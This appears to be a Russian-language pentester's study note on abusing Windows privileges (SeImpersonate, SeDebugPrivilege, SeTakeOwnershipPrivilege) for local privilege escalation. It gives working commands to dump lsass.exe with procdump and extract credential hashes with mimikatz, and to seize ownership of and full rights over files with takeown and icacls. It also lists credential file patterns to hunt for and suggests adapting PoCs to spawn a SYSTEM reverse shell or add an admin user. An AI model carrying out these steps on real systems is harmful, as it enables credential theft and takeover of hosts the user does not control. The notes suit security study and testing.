#windows #AD #privillage 

## Включение всех привилегий

В Windows по умолчанию отсутсвует опция включения привилегий, поэтому используем 2 скрипт

1) [Enable-Privilege.ps1](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)
2) [EnableAllTokenPrivs.ps1](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)

# 1 и 2) SeImpersonate и SeAssignPrimaryToken

> **SeImpersonate** - Эта привилегия позволяет программе **выдавать себя за другого пользователя**

> **SeAssignPrimaryTokenPrivilege** - она позволяет процессу **самостоятельно назначить токен** новому процессу

Эти Привилегии позволяют проводить атаки [[Potato Attacks]] и [[PrintSpoofer]], чтобы добиться [LPE](obsidian://open?vault=Obsidian%20Vault&file=Windows%2FAD%2F3.%20%D0%9F%D0%BE%D0%B2%D1%8B%D1%88%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%BF%D1%80%D0%B8%D0%B2%D0%B8%D0%BB%D0%B5%D0%B3%D0%B8%D0%B9%20(LPE))

# 3) SeDebugPrivilege

>  С привилегией **SeDebugPrivilege** ты контролируешь любой процесс. С помощью этой привилегии администратор подключается к процессу и может его дебажить, атакующий же в свою очередь может сдампить память

#### 1) Проводим *DUMP* процесса **lsass.exe**

1) Проводим дамп и сохраняем в файл
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

2) Скармливаем дамп mimikatz
```powershell
sekurlsa::minidump lsass.dmp
```

3) Извлекаем хэши
```powershell
sekurlsa::logonpasswords
```

#### 2) RCE

Существуют и другие инструменты, подобные [SeDebugPrivilegePoC,](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) позволяющие получить доступ к командной оболочке SYSTEM, когда у нас есть `SeDebugPrivilege`Часто у нас не будет доступа по RDP к хосту, поэтому нам придётся модифицировать наши PoC, чтобы они либо возвращали обратную оболочку на атакующий хост от имени SYSTEM, либо выполняли другую команду, например, добавляли пользователя-администратора

# 4) SeTakeOwnershipPrivilege

> Эта привилегия назначает права WRITE_OWNER над объектом, что означает, что пользователь может изменить владельца в дескрипторе безопасности объекта

Обладая этой привилегией, пользователь может получить права собственности на любой файл или объект и вносить изменения, которые могут повлечь за собой доступ к конфиденциальным данным `RCE` или `DoS`

Полезно просмотреть: `passwords.*`, `pass.*`, `creds.*`, `.kdbx` итд
### Применение

1) Находим привлекательный файл, понимаем, что у нас на него нет прав
2) Изменяем владельца на нас
```powershell
takeown /f secret.txt
```

3) Далее нам нужно изменить ACL файла 
```powershell
icacls secret.txt /grant <user>:F
```